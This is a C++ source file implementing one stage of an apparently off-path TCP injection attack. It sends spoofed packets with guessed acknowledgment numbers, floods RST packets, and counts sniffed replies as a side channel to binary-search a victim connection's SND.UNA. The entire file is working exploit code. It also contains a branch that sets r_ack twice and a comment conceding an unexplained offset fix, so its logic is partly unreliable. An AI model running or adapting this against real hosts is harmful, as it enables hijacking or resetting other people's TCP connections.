//
// Created by Jan Seredynski on 31/07/2018.
//

#include "find_ack.h"



uint32_t testACK(Clock &clock, IP legit_pkt, IP spoofed_pkt, uint32_t victim_to_server_seq){
    legit_pkt.rfind_pdu<TCP>().set_flag(TCP::Flags::RST, 1);
    EthernetII legit_eth = EthernetII(serverMAC, info.hw_addr) / legit_pkt;
    TCP &spoofed_tcp = spoofed_pkt.rfind_pdu<TCP>();
    spoofed_tcp.set_flag(TCP::Flags::RST, 0);
    spoofed_tcp.set_flag(TCP::Flags::ACK, 1);

    std::cout<<"Step 4 - Find ACK\nRound 1\n";

    sniff_counter=0;

    auto start = std::chrono::high_resolution_clock::now();
    spoofed_tcp.seq(victim_to_server_seq);  // TO BE UPDATED (in-window seq)

    // 1G x1
    spoofed_tcp.ack_seq(0);
    sender.send(spoofed_pkt);

    // 2G x2
    spoofed_tcp.ack_seq(1073741823);
    sender.send(spoofed_pkt);
    sender.send(spoofed_pkt);

    // 3G x4
    spoofed_tcp.ack_seq(2147483647);
    sender.send(spoofed_pkt);
    sender.send(spoofed_pkt);
    sender.send(spoofed_pkt);
    sender.send(spoofed_pkt);

    // 4G x8
    spoofed_tcp.ack_seq(3221225471);
    sender.send(spoofed_pkt);
    sender.send(spoofed_pkt);
    sender.send(spoofed_pkt);
    sender.send(spoofed_pkt);
    sender.send(spoofed_pkt);
    sender.send(spoofed_pkt);
    sender.send(spoofed_pkt);
    sender.send(spoofed_pkt);


    for (unsigned int i = 0; i < ACK_LIMIT; i++){
        sender.send(legit_eth);
    }
    clock += std::chrono::seconds{2};
    std::this_thread::sleep_until(clock);
    std::cout<<"sniff count:"<<sniff_counter<<"\n";
    auto finish = std::chrono::high_resolution_clock::now();
    std::chrono::duration<double> elapsed = finish - start;
    clock += std::chrono::seconds{2};
    std::cout << "\tElapsed time: "<< elapsed.count() << "s\n";
    uint32_t l_ack = 0, r_ack=0;
    uint32_t G = 1073741824; // 2^30
    if(sniff_counter==(ACK_LIMIT-1)){
        l_ack = 3*G-1;
        r_ack = 4*(G-1);
    }
    else if(sniff_counter==(ACK_LIMIT-2)){
        l_ack = 0;
        r_ack =G-1;
    }
    else if(sniff_counter==(ACK_LIMIT-4)){
        l_ack = G;
        r_ack =2*G-1;
    }
    else if(sniff_counter==(ACK_LIMIT-8)){
        r_ack =2*G;
        r_ack =3*G-1;
    }

    else if(sniff_counter==(ACK_LIMIT-3)){
        l_ack = 3*G-1;
        r_ack = 4*(G-1);
    }
    else if(sniff_counter==(ACK_LIMIT-6)){
        l_ack = 0;
        r_ack =2*G-1;
    }
    else if(sniff_counter==(ACK_LIMIT-12)){
        l_ack = G;
        r_ack =3*G-1;
    }
    else if(sniff_counter==(ACK_LIMIT-9)){
        l_ack = 2*G-1;
        r_ack = 4*(G-1);
    }
    else{
        std::cout<<"Wrong G";
        exit(-1);
    }
    sniff_counter = 0;
    // ROUND 2


    uint32_t mid=0;
    while(l_ack < r_ack){
        mid = (uint32_t)((((uint64_t)l_ack) + ((uint64_t)r_ack)) / 2);
        std::cout<<"Step 2 - SEQ range: ("<<l_ack<<", "<<mid<<", "<<r_ack<<")";
        auto start = std::chrono::high_resolution_clock::now();
        spoofed_tcp.ack_seq(mid);
        sender.send(spoofed_pkt);
        for (unsigned int i = 0; i < ACK_LIMIT; i++){
            sender.send(legit_eth, iface);
        }
        auto finish = std::chrono::high_resolution_clock::now();
        std::chrono::duration<double> elapsed = finish - start;
        clock += std::chrono::seconds{2};
        std::this_thread::sleep_until(clock);
        std::cout << "\tElapsed time: "<< elapsed.count() << "s sniff:"<<sniff_counter<<"\n";
        if(sniff_counter == ACK_LIMIT){
            l_ack = mid;
        } else{
            r_ack = mid;
        }
        sniff_counter = 0;
        if(r_ack - l_ack <= 3){
            break;
        }
    }
    sniff_counter=0;
    std::cout<<"Round 2: Found: "<<l_ack<<"\n";

    // Find exactly
    l_ack-=(2*ACK_LIMIT); // check from two spaces before
    for (int k = 0; k < 5; ++k) {  // chech to two spaces after

        for (unsigned int j = 0; j < ACK_LIMIT; j++) {
            spoofed_tcp.ack_seq(l_ack + j);
            sender.send(spoofed_pkt);
        }

        for (unsigned int i = 0; i < ACK_LIMIT; i++) {
            sender.send(legit_eth, iface);
        }
        clock += std::chrono::seconds{2};
        std::this_thread::sleep_until(clock);
        std::cout << "Checking border(" << l_ack << ", " << l_ack + ACK_LIMIT << ")\n";
        std::cout << "Calculate ack (" << l_ack + 2147483647 << ", " << l_ack + 2147483647 + ACK_LIMIT << ")\n";
        // 2^31-1 = 2147483647
        if (sniff_counter < ACK_LIMIT) {
            l_ack += sniff_counter;
            std::cout << "Sniff: " << sniff_counter << "\n";
            std::cout << "ACK left border is " << l_ack << "\n";
            /*
             *     border                  SND.UNA
             *       X|                        |
             *
             *      X is l_ack. It is one byte to the left from border
             *
             */
            l_ack = l_ack + (2147483647);  // 2^31-1
            l_ack += 1; // prabably i missed sth in the previous caluculations +3 works
            std::cout << "SND.UNA= " << l_ack << "\n";
            sniff_counter = 0;
            spoofed_tcp.set_flag(TCP::Flags::ACK, 0);
            return l_ack;
        } else {
            std::cout << "Cannot find SND.UNA\n";
        }
        sniff_counter = 0;
        l_ack+=ACK_LIMIT;
    }
    exit(-1); // something went wrong
}